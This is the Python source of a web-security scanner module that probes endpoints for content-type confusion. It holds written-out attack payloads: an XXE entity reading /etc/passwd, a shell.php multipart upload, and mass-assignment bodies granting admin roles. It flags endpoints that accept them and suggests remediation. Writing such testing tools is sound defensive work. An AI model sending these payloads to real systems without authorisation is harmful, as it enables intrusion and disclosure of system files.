"""
GrotAssault — Content-type switching attack payloads.

Tests for parser confusion by sending payloads with mismatched content types.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass
from typing import Any, Dict, List, Optional

from krumpa.core import Finding, Severity, Target

logger = logging.getLogger("krumpa.grotassault.content_type")


@dataclass
class ContentTypeProbe:
    """A content-type switching probe."""
    original_type: str
    switched_type: str
    payload: str
    description: str


CONTENT_TYPE_PROBES: List[ContentTypeProbe] = [
    ContentTypeProbe(
        original_type="application/json",
        switched_type="application/xml",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>',
        description="JSON→XML: XXE via content-type switch",
    ),
    ContentTypeProbe(
        original_type="application/json",
        switched_type="application/x-www-form-urlencoded",
        payload="username=admin&password=test&role=admin",
        description="JSON→Form: parameter pollution via content-type switch",
    ),
    ContentTypeProbe(
        original_type="application/json",
        switched_type="text/xml",
        payload='<root><username>admin</username><role>admin</role></root>',
        description="JSON→text/xml: parser confusion",
    ),
    ContentTypeProbe(
        original_type="application/x-www-form-urlencoded",
        switched_type="application/json",
        payload='{"username":"admin","role":"admin","is_admin":true}',
        description="Form→JSON: mass assignment via content-type switch",
    ),
    ContentTypeProbe(
        original_type="application/json",
        switched_type="multipart/form-data; boundary=----BOUNDARY",
        payload="------BOUNDARY\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo 'CT_SWITCH'; ?>\r\n------BOUNDARY--",
        description="JSON→Multipart: file upload via content-type switch",
    ),
]


class ContentTypeSwitcher:
    """Test for parser confusion via content-type mismatches."""

    def __init__(self, http_client: Any = None) -> None:
        self._client = http_client
        self._owns_client = False

    async def check(self, target: Target) -> List[Finding]:
        """Test content-type switching attacks."""
        if not self._client:
            return []

        findings: List[Finding] = []

        for probe in CONTENT_TYPE_PROBES:
            try:
                resp = await self._client.request(
                    method=target.method or "POST",
                    url=target.url,
                    content=probe.payload.encode(),
                    headers={"Content-Type": probe.switched_type},
                )

                if resp.status_code < 400:
                    text = resp.text if hasattr(resp, 'text') else ""
                    # Signs the switched content was processed
                    suspicious = (
                        resp.status_code < 300
                        or "admin" in text.lower()
                        or "root:" in text
                        or "CT_SWITCH" in text
                    )

                    if suspicious:
                        findings.append(Finding(
                            title=f"Content-type confusion: {probe.original_type} → {probe.switched_type}",
                            description=(
                                f"Endpoint {target.url} processed a request with "
                                f"Content-Type: {probe.switched_type} when it normally "
                                f"expects {probe.original_type}. {probe.description}"
                            ),
                            severity=Severity.MEDIUM,
                            target=target,
                            evidence=f"switched_type={probe.switched_type}, status={resp.status_code}",
                            remediation=(
                                "Validate Content-Type header strictly. Reject requests "
                                "with unexpected content types."
                            ),
                            cwe=436,  # Interpretation Conflict
                            tags=["content-type", "parser-confusion"],
                        ))

            except Exception as exc:
                logger.debug("Content-type switch error: %s", exc)

        return findings
